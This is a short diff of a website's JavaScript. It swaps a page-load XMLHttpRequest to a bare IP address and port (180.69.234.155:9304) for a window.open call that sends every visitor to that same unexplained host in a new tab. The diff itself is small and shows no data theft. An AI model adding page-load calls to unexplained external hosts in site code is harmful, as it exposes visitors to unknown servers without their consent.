@@ -46,11 +46,6 @@ window.addEventListener('DOMContentLoaded', event => {
         });
     });
 
-    let xhr = new XMLHttpRequest();
-    xhr.open("GET", "http://180.69.234.155:9304");
-
-    xhr.send();
-
-    xhr.onload = () => console.log(xhr.responseText);
+    window.open("http://180.69.234.155:9304", "_blank");
 
 });
